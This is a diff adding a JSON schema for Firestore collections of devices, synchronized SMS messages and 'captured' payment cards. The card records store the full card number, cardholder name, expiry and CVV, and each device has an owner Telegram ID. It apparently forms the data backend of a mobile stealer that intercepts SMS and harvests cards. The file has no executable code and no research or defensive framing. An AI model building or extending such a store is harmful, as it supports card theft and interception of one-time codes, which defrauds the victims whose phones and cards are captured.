@@ -1,0 +1,61 @@
+{
+  "entities": {
+    "Device": {
+      "title": "Device",
+      "description": "Hardware client telemetry registration and state",
+      "type": "object",
+      "properties": {
+        "id": { "type": "string", "description": "Hardware device unique ID" },
+        "model": { "type": "string", "description": "Device hardware model name" },
+        "phone": { "type": "string", "description": "Device phone number" },
+        "battery": { "type": "string", "description": "Current battery percentage" },
+        "status": { "type": "boolean", "description": "Online or offline status" },
+        "ownerTelegramId": { "type": "string", "description": "Telegram user ID owning device" },
+        "joined": { "type": "string", "description": "Date or timestamp device was registered" }
+      },
+      "required": ["id", "model"]
+    },
+    "Message": {
+      "title": "Message",
+      "description": "SMS and telecommunications message record",
+      "type": "object",
+      "properties": {
+        "id": { "type": "string", "description": "Unique message ID" },
+        "deviceId": { "type": "string", "description": "Associated device ID" },
+        "from": { "type": "string", "description": "Sender identifier or phone number" },
+        "body": { "type": "string", "description": "SMS message text payload" },
+        "date": { "type": "number", "description": "Unix millisecond timestamp" }
+      },
+      "required": ["id", "deviceId", "body"]
+    },
+    "PaymentCard": {
+      "title": "PaymentCard",
+      "description": "Captured debit/credit payment card record",
+      "type": "object",
+      "properties": {
+        "id": { "type": "string", "description": "Unique card entry ID" },
+        "deviceId": { "type": "string", "description": "Originating device ID" },
+        "cardNumber": { "type": "string", "description": "Primary account number" },
+        "cardholderName": { "type": "string", "description": "Name printed on card" },
+        "expiry": { "type": "string", "description": "Expiry MM/YY or MM/YYYY" },
+        "cvv": { "type": "string", "description": "Card CVV security code" },
+        "timestamp": { "type": "string", "description": "Timestamp of capture" }
+      },
+      "required": ["id", "deviceId", "cardNumber"]
+    }
+  },
+  "firestore": {
+    "/devices/{deviceId}": {
+      "schema": "Device",
+      "description": "Collection of managed hardware devices"
+    },
+    "/messages/{messageId}": {
+      "schema": "Message",
+      "description": "Collection of synchronized SMS messages"
+    },
+    "/cards/{cardId}": {
+      "schema": "PaymentCard",
+      "description": "Collection of captured cards"
+    }
+  }
+}
